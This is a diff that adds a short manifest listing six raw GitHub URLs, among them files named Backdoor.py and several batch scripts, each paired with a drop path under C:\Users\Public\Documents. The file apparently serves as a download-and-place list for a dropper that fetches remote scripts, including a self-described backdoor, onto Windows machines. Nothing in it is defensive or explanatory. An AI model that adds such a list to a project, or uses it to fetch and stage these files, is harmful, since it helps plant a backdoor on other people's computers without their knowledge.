@@ -1,0 +1,15 @@
+URLS;=
+https://raw.githubusercontent.com/thompog/bvbnc/refs/heads/main/main.py
+https://raw.githubusercontent.com/thompog/bvbnc/refs/heads/main/download.py
+https://raw.githubusercontent.com/thompog/d/refs/heads/main/Backdoor.py
+https://raw.githubusercontent.com/thompog/d/refs/heads/main/japper.bat
+https://raw.githubusercontent.com/thompog/d/refs/heads/main/japper_killer.bat
+https://raw.githubusercontent.com/thompog/d/refs/heads/main/bb7.bat
+PATHS;=
+C:\Users\Public\Documents\form\main.py
+C:\Users\Public\Documents\form\download.py
+C:\Users\Public\Documents\Backdoor.py
+C:\Users\Public\Documents\japper\japper.bat
+C:\Users\Public\Documents\japper\japper_killer.bat
+C:\Users\Public\Documents\bb7.bat
+EOF;;
